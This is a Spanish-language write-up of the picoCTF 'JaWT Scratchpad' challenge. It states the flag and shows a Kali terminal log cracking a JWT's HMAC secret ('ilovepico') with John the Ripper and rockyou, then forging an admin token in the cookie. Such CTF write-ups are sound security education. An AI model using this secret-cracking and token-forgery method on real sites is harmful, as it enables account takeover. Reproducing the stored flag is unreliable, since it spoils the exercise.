## **Descripcion**
Check the admin scratchpad!http://fickle-tempest.picoctf.net:65436
## **Solucion**
picoCTF{jawt_was_just_what_you_thought_bbb82bd4a57564aefb32d69dafb60583}

## **Notas adicionales**
Se hizo uso del inspector y la herramienta de cookie editor, la pagina jwt debugger,
en la pagina proporcionada por pico, se tuvo que ingresar el nombre de usuario en mi caso fue alex,despues de eso me dio una serie de numeros en el token de cookie editor  ese token lo pasamos a la pagina de jwt,ahi nos sale un apartado de agregar contraseña secreta esa la obtuvimos de la consola con esta serie de comandos.

```
┌──(kali㉿kali)-[~]
└─$ nano hash         
                                                                             
┌──(kali㉿kali)-[~]
└─$ cat hash     
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiQWxleCJ9.QEE1yS-AU8KD_OA00mTlw2n3ygLOX-CAs3x1tyNC6Ao
                                                                             
┌──(kali㉿kali)-[~]
└─$ ls /usr/share/wordlists
dirb        fasttrack.txt  legion      rockyou.txt.gz  wifite.txt
dirbuster   fern-wifi      metasploit  sqlmap.txt
dnsmap.txt  john.lst       nmap.lst    wfuzz
                                                                             
┌──(kali㉿kali)-[~]
└─$ sudo grip -d /usr/share/wordlists/rockyou.txt.gz
[sudo] password for kali: 
sudo: grip: command not found
                                                                             
┌──(kali㉿kali)-[~]
└─$ sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
                                                                             
┌──(kali㉿kali)-[~]
└─$ ls                     
Desktop    Downloads  Music     Public     Videos
Documents  hash       Pictures  Templates
                                                                             
┌──(kali㉿kali)-[~]
└─$ ls /usr/share/wordlists                         
dirb        fasttrack.txt  legion      rockyou.txt  wifite.txt
dirbuster   fern-wifi      metasploit  sqlmap.txt
dnsmap.txt  john.lst       nmap.lst    wfuzz
                                                                             
┌──(kali㉿kali)-[~]
└─$ head /usr/share/wordlists/rockyou.txt 
123456
12345
123456789
password
iloveyou
princess
1234567
rockyou
12345678
abc123
                                                                             
┌──(kali㉿kali)-[~]
└─$ jhon
Command 'jhon' not found, did you mean:
  command 'jshon' from deb jshon
  command 'john' from deb john
Try: sudo apt install <deb name>
                                                                             
┌──(kali㉿kali)-[~]
└─$ sudo apt install jonh                           
Error: Unable to locate package jonh
                                                                             
┌──(kali㉿kali)-[~]
└─$ sudo apt install john
john is already the newest version (1.9.0-Jumbo-1+git20211102-0kali10).
john set to manually installed.
Summary:                    
  Upgrading: 0, Installing: 0, Removing: 0, Not Upgrading: 1628
                                                                             
┌──(kali㉿kali)-[~]
└─$ john
Created directory: /home/kali/.john
John the Ripper 1.9.0-jumbo-1+bleeding-aec1328d6c 2021-11-02 10:45:52 +0100 OMP [linux-gnu 64-bit x86_64 AVX2 AC]
Copyright (c) 1996-2021 by Solar Designer and others
Homepage: https://www.openwall.com/john/

Usage: john [OPTIONS] [PASSWORD-FILES]

Use --help to list all available options.

┌──(kali㉿kali)-[~]
└─$ john hash -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ilovepico        (?)     
1g 0:00:00:01 DONE (2026-02-28 18:56) 0.5847g/s 4325Kp/s 4325Kc/s 4325KC/s iloverob4live345..ilovemymother@
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 


```

La palabra ilovepico, en la pagian de jwt, en la contraseña secreta se agrega,se vera que se cambio el token,copias, vas al cookie editor,modificas el values a guardas, refrescas y tendras la bandera.
## **Referencias**
### JaWT Scratchpad
Referencias:
- JSON: https://en.wikipedia.org/wiki/JSON
- JWT : https://jwt.io/introduction
- jwt debugger : https://jwt.lannysport.net/
- john : https://github.com/openwall/john
picoCTF 2019 writeup [10] - Web - JaWT Scratchpad - https://www.youtube.com/watch?v=iaKbvrbcSko&list=PLDo9DMLZyP6kTZ8Td37-LdbAx4-yNfHBl&index=10